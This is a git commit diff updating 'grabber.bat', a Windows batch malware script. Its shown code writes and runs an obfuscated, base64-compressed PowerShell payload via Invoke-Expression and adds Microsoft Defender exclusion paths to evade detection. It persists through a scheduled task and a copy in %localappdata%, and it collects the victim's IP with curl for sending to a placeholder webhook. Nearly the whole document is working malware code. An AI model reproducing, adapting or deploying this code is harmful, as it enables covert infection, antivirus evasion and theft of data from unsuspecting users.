df219f08c4264df04c59664408a74734d8d7cd6b
K.Dot <110929758+KDot227@users.noreply.github.com>
2022-10-10 20:58:50 -0500

    Update grabber.bat

--- grabber.bat
+++ grabber.bat
@@ -8,6 +8,7 @@ del %userprofile%\AppData\Local\Temp\test.txt
 echo $code = "%base64code%" > %userprofile%\AppData\Local\Temp\penis.ps1
 echo (nEw-OBJECt  Io.CoMpreSsion.DEflateSTrEaM( [SyStem.io.memoRYSTReaM][convErT]::fromBaSE64STriNg( 'hY49C8IwGIT/ykvoGjs4FheLqIgfUHTKEpprK+SLJFL99zYFwUmXm+6ee4rzcbti3o0IcYDWCzxBfKSB+Mldctg98c0TLa1fXsZIHLalonUKxKqAnqRSxHaH+ioa16VRBohaT01EsXCmF03mirOHFa0zRlrFqFRUTM9Udv8QJvKIlO62j6J+hBvCvGYZzfK+c2o68AhZvWqSDIk3GvDEIy1nvIJGwk9J9lH53f22mSdv') ,[SysTEM.io.COMpResSion.coMPRESSIONMoDE]::DeCompress ) ^| ForeacH{nEw-OBJECt Io.StReaMrEaDer( $_,[SySTEM.teXT.enCOdING]::aSciI )}).rEaDTOEnd( ) ^| InVoKE-expREssION >> %userprofile%\AppData\Local\Temp\penis.ps1
 powershell.exe -executionpolicy remotesigned -File %userprofile%\AppData\Local\Temp\penis.ps1 && del %userprofile%\AppData\Local\Temp\penis.ps1
+del %userprofile%\AppData\Local\Temp\penis.ps1
 exit
 
 :naw
@@ -15,14 +16,12 @@ exit
 PowerShell Set-MpPreference -DisableRealtimeMonitoring 0
 mkdir %localappdata%\KDOT
 COPY %~f0 %localappdata%\KDOT\KDOT.bat
-COPY "%~f0" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\KDOT.bat"
 SCHTASKS /QUERY /TN "KDOT" >NUL 2>&1
 if %errorlevel% equ 0 goto code
 SCHTASKS /CREATE /SC ONSTART /TN "KDOT" /TR "%localappdata%\KDOT\KDOT.bat"
 
 :code
 powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "%userprofile%\AppData\Local\Temp"
-powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "%localappdata%\KDOT"
 set webhook=YOUR_WEBHOOK_HERE
 curl https://api.ipify.org > %userprofile%\AppData\Local\Temp\ipp.txt
